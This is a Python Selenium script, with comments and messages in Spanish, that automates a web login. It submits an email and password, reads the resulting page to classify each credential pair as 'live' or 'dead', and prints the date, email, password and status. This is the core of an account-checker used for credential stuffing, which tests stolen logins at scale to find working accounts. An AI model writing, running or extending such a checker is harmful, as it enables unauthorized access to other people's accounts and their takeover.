import datetime
import logging
import concurrent.futures
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException,TimeoutException

logger = logging.getLogger(__name__)
now = datetime.datetime.now()
fecha = now.strftime("%d-%m-%y")


def BuscarElemento(driver, metodo, identificador):
    try:
        element = driver.find_element(metodo, identificador)

        # element = WebDriverWait(driver, 10).until(
        #     EC.presence_of_element_located((metodo, identificador))
        # )

        return (metodo, identificador)
    except Exception as e:
        return None

def CargaRapidaElemento(driver, correo, contrasena,**kwargs):

    Co = str(correo)
    Cs = str(contrasena)

    elementos_a_buscar = [ 
        (kwargs.get('By'),kwargs.get('Expresion')),
        (By.ID, 'password-error'),
        (By.XPATH, '/html/body/div/div/main/div/div/div/div/div[2]/div/div[1]/h1')
    ]

    with concurrent.futures.ThreadPoolExecutor() as executor:
        resultados = {executor.submit(BuscarElemento, driver, metodo, identificador): (metodo, identificador) for metodo, identificador in elementos_a_buscar}

        for futuro in concurrent.futures.as_completed(resultados):
            resultado = resultados[futuro]

            if futuro.result():
                metodo, identificador = resultado
   
                if metodo == By.ID and identificador == 'password-error':
                    print(f'[{fecha}] [Correo:{Co}] [Contrasena:{Cs}] [Estado:password]')
                    # driver.quit()
                    return 'dead'

                elif metodo == By.XPATH and identificador.endswith('/h1'):
                    print(f'[{fecha}] [Correo:{Co}] [Contrasena:{Cs}] [Estado:pin]')
                    # driver.quit()
                    return 'dead'
                
                elif metodo == kwargs.get('By') and identificador == kwargs.get('Expresion'):
                    # print(f'[{fecha}] [Correo:{Co}] [Contrasena:{Cs}] [Estado: Dead]')
                    return True,'live'
                    
            return True,'[+] No se encontraron los Elementos'
                
        # driver.quit()
     
    return False  # Ningún elemento encontrado en el tiempo especificado

def BusquedaCasillaConstrasena(driver,short,Correo,Contrasena):

    try:
        sshort = WebDriverWait(driver, 3)
        logger.debug('Enviando Contrasena')  
        contrasena = sshort.until(EC.presence_of_element_located((By.ID,'password'))).send_keys(Contrasena) 
        ContrasenaClick = driver.find_element(By.XPATH,'/html/body/div/div/main/div/div/div/div/div[2]/div/form/button').click()

        print('[+] Evaluando verficacion')
        verificacion = short.until(EC.presence_of_element_located((By.XPATH,'/html/body/div/div/div/div[4]/div/main/div/button'))).text
        if verificacion == 'Cerrar sesión':
            # print(f'[{fecha}] [Correo:{Correo}] [Contrasena:{Contrasena}] [Estado:Live]')
            pass

    except TimeoutException:
        resp = CargaRapidaElemento(driver,Correo,Contrasena)
        driver.quit()

